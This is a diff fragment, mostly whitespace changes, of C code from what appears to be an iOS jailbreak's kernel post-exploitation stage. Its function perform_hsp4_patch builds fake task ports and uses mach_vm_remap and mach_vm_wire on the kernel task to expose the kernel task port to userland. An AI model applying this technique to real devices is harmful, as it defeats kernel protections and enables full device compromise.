@@ -191,43 +191,43 @@ bool perform_hsp4_patch(mach_port_t *port)
 	uint64_t kernel_map = kernel_read64(kernel_task_kaddr + OFFSET(task, vm_map));
 
 	uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
-    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
+	uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
 
-    make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
-    make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
+	make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
+	make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
 
-    km_fake_task_port = zm_fake_task_port;
+	km_fake_task_port = zm_fake_task_port;
 
-    vm_prot_t cur, max;
+	vm_prot_t cur, max;
 
-    ret = mach_vm_remap(km_fake_task_port,
-                        &remapped_task_addr,
-                        sizeof_task,
-                        0,
-                        VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
-                        zm_fake_task_port,
-                        kernel_task_kaddr,
-                        0,
-                        &cur, &max,
-                        VM_INHERIT_NONE);
+	ret = mach_vm_remap(km_fake_task_port,
+	                    &remapped_task_addr,
+	                    sizeof_task,
+	                    0,
+	                    VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
+	                    zm_fake_task_port,
+	                    kernel_task_kaddr,
+	                    0,
+	                    &cur, &max,
+	                    VM_INHERIT_NONE);
 
-    if (ret != KERN_SUCCESS) {
-        fprintf(stderr, "[remap_hsp4] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
-        
-        return false;
-    }
+	if (ret != KERN_SUCCESS) {
+	    fprintf(stderr, "[remap_hsp4] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
+	    
+	    return false;
+	}
 
-    if (kernel_task_kaddr == remapped_task_addr) {
-       fprintf(stderr, "[remap_hsp4] remap failure: addr is the same after remap\n");
-        
-        return false;
-    }
+	if (kernel_task_kaddr == remapped_task_addr) {
+	   fprintf(stderr, "[remap_hsp4] remap failure: addr is the same after remap\n");
+	    
+	    return false;
+	}
 
-    printf("[remap_hsp4] remapped successfully to 0x%llx\n", remapped_task_addr);
+	printf("[remap_hsp4] remapped successfully to 0x%llx\n", remapped_task_addr);
 
-    ret = mach_vm_wire(host, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
+	ret = mach_vm_wire(host, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
 
-    if (ret != KERN_SUCCESS) {
+if (ret != KERN_SUCCESS) {
         fprintf(stderr, "[remap_hsp4] wire failed: 0x%x (%s)\n", ret, mach_error_string(ret));
         
         return false;
